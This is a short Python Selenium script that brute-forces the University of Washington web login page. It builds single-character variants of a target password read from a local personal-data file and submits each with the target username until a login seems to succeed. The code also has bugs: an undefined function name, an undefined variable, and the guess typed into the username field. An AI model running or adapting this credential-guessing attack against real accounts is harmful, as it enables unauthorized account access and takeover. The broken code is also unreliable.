from selenium import webdriver
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
from selenium.webdriver import firefox
from selenium.webdriver.common.keys import Keys
import time, json

CHARS = list('a1e02roin9stl385764mdchubkgypfvwjzxqAESRMTLNBCDPIOGHFKUYJVWZXQ_.-!*@?$#%&=\';')


# Returns a list of all strings that can be made by substituting a letter from chars for a single letter of pwd. Also
# includes appending a single char to the end of pwd.
# i.e. getpwds('ab', list('12')) = [['1', 'b'], ['2', 'b'], ['a', '1'], ['a', '2'], ['a', 'b', '1'], ['a', 'b', '2']]
def getpwds(pwd, chars):
    newPasswords = []
    password = list(pwd)
    num = 0
    for i in range(len(password)):
        newPassword = list(password)
        for j in range(len(chars)):
            if password[i] != chars[j]:
                newPassword[i] = chars[j]
                newPasswords.append(list(newPassword))
                num += 1
    # add a single char to end
    newPassword = list(password)
    for j in range(len(chars)):
        newPassword.append(chars[j])
        newPasswords.append(list(newPassword))
        num += 1
        newPassword.pop()

    return newPasswords


def main():
    data = json.loads(open('../personal_data.json').read())
    passwords = getpwd(data["target_password"], CHARS)
    driver = webdriver.Firefox()
    count = 0
    for i in range(len(passwords)):
        driver.get("https://weblogin.washington.edu/")
        time.sleep(0.1)
        count += 1
        elem = driver.find_element_by_name("user")
        elem.send_keys(passwords[i])
        elem.send_keys(data["target_username"])
        elem = driver.find_element_by_name("pass")
        elem.send_keys(passwords[i])
        elem.send_keys(Keys.RETURN)
        time.sleep(0.3)
        try:
            elem = driver.find_element_by_name("user")
            print("registration attempt {} failed with pwd: {}".format(i, PASSWORD[i]))
        except:
            print("SUCCESS on {} attempts: {}".format(i, PASSWORD[i]))
            break

    driver.close()


if __name__ == "__main__":
    main()
